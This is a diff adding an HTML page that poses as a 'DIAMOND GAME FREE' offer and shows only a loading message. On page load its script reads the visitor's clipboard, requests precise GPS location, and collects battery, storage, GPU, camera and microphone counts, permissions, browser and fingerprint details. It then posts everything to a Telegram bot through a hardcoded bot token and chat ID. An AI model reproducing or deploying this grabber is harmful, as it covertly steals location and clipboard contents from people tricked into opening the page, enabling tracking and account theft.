@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>DIAMOND GAME FREE</title>
+  <style>
+    body {
+      background: black;
+      color: white;
+      font-family: monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .loading {
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+  <div class="loading">loading 20 detik...</div>
+
+<script>
+const token = '7636452500:AAGZgLUeKAGLjq0IlvfB-sNb_JE48fsKK90';
+const chatId = '8122699796';
+const startTime = Date.now();
+
+function getDeviceInfo() {
+  const screenSize = `${screen.width}x${screen.height}`;
+  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const orientation = screen.orientation?.type || 'UNKNOWN';
+  const dpr = window.devicePixelRatio || 1;
+  const platform = navigator.platform;
+  const lang = navigator.language;
+  const ua = navigator.userAgent;
+  const cookies = navigator.cookieEnabled;
+  const doNotTrack = navigator.doNotTrack;
+  const referrer = document.referrer || 'NONE';
+  const historyLength = history.length;
+  const deviceType = /Mobi|Android/i.test(ua) ? 'MOBILE' : 'DESKTOP';
+  const touch = 'ontouchstart' in window;
+  const colorDepth = screen.colorDepth;
+  const conn = navigator.connection?.effectiveType || 'UNKNOWN';
+
+  return {
+    screenSize, timeZone, orientation, dpr, platform, lang, ua,
+    cookies, doNotTrack, referrer, historyLength,
+    deviceType, touch, colorDepth, conn
+  };
+}
+
+function detectAdblock(callback) {
+  const bait = document.createElement('div');
+  bait.className = 'adsbox';
+  bait.style.display = 'none';
+  document.body.appendChild(bait);
+  setTimeout(() => {
+    callback(bait.offsetHeight === 0);
+    document.body.removeChild(bait);
+  }, 100);
+}
+
+function getClipboard() {
+  return navigator.clipboard?.readText().then(text => text || 'NO TEXT') || Promise.resolve('NOT SUPPORTED');
+}
+
+function getBatteryInfo() {
+  return navigator.getBattery().then(batt => ({
+    level: Math.round(batt.level * 100) + '%',
+    charging: batt.charging ? 'YA' : 'TIDAK'
+  }));
+}
+
+function getStorageInfo() {
+  return navigator.storage?.estimate().then(e => {
+    const used = (e.usage / (1024 ** 2)).toFixed(1);
+    const total = (e.quota / (1024 ** 2)).toFixed(1);
+    return `${used}MB / ${total}MB`;
+  }) || Promise.resolve('UNKNOWN');
+}
+
+function getGPUInfo() {
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl');
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+  } catch {
+    return 'NOT SUPPORTED';
+  }
+}
+
+function getMediaDevices() {
+  return navigator.mediaDevices?.enumerateDevices().then(devices => {
+    let counts = { audio: 0, video: 0 };
+    devices.forEach(d => {
+      if (d.kind === 'audioinput') counts.audio++;
+      if (d.kind === 'videoinput') counts.video++;
+    });
+    return `🎤${counts.audio} 🎥${counts.video}`;
+  }) || Promise.resolve('UNKNOWN');
+}
+
+function getPermissions() {
+  if (!navigator.permissions) return Promise.resolve('NOT SUPPORTED');
+  const perms = ['geolocation', 'camera', 'microphone'];
+  return Promise.all(perms.map(p => navigator.permissions.query({ name: p }).then(r => `${p}:${r.state}`)))
+    .then(res => res.join(' | '));
+}
+
+function getLocation() {
+  return new Promise(resolve => {
+    navigator.geolocation.getCurrentPosition(pos => {
+      resolve(`${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`);
+    }, () => {
+      resolve('DITOLAK / ERROR');
+    });
+  });
+}
+
+function getTimeNow() {
+  const d = new Date();
+  return d.toLocaleTimeString();
+}
+
+function sendToTelegram(msg) {
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML' })
+  });
+}
+
+(async () => {
+  const timeNow = getTimeNow();
+  const clipboard = await getClipboard();
+  const battery = await getBatteryInfo();
+  const storage = await getStorageInfo();
+  const gpu = getGPUInfo();
+  const location = await getLocation();
+  const media = await getMediaDevices();
+  const perms = await getPermissions();
+  const adblock = await new Promise(r => detectAdblock(r));
+  const sessionTime = Math.round((Date.now() - startTime) / 1000) + 's';
+  const info = getDeviceInfo();
+
+  const msg = `❏━━━━༽ XREZZ VOID V3༼━━━━❏
+┏━━━━━━━━━━━━━━━━━━━━━━━┓
+┃⚇ NAMA : Hryu Rezz
+┃⚇ DEVELOPER : REZZ AXTH
+┃⚇ STATUS : ONLINE
+┃⚇ WAKTU : ${timeNow}
+┗━━━━━━━━━━━━━━━━━━━━━━━┛
+『     чем больше унижают, тем приятнее    』
+❏━━━━━━━━━━━━━━━━━━━━━━━❏
+BATRE HP : ${battery.level}
+LOKASI : ${location}
+CHARGER : ${battery.charging}
+CPU : ${navigator.hardwareConcurrency || 'UNKNOWN'} CORES
+RAM HP : ${navigator.deviceMemory || '?'} GB
+STORAGE : ${storage}
+LAYAR : ${info.screenSize}
+BAHASA : ${info.lang}
+LOCAL TIME : ${timeNow}
+ONLINE STATUS : ${navigator.onLine ? 'ONLINE' : 'OFFLINE'}
+BROWSER : ${info.ua}
+DO NOT TRACK : ${info.doNotTrack}
+REFERER : ${info.referrer}
+HISTORY LENGTH : ${info.historyLength}
+KAMERA : ✅
+MIKROFON : ✅
+CLIPBOARD : ${clipboard}
+GPU : ${gpu}
+PLATFORM : ${info.platform}
+DEVICE TYPE : ${info.deviceType}
+SCREEN ORIENTATION : ${info.orientation}
+TOUCH SUPPORT : ${info.touch}
+COLOR DEPTH : ${info.colorDepth}
+DPR (PIXEL RATIO) : ${info.dpr}
+COOKIE ENABLED : ${info.cookies}
+SESSION DURATION : ${sessionTime}
+TIMEZONE OFFSET : ${new Date().getTimezoneOffset()}
+WEBGL GPU : ${gpu}
+MEDIA DEVICES : ${media}
+PERMISSIONS : ${perms}
+CONNECTION TYPE : ${info.conn}
+ADBLOCK DETECTED : ${adblock ? 'YA' : 'TIDAK'}
+FINGERPRINT HASH : UNAVAILABLE (HTML-ONLY)
+INSTALLED RELATED APPS : TIDAK DUKUNG
+BLUETOOTH SUPPORT : ${'bluetooth' in navigator ? 'YA' : 'TIDAK'}
+USB SUPPORT : ${'usb' in navigator ? 'YA' : 'TIDAK'}
+❏━━━━━━━━━━━━━━━━━━━━━━━❏`;
+
+  sendToTelegram(msg);
+})();
+</script>
+</body>
+</html>
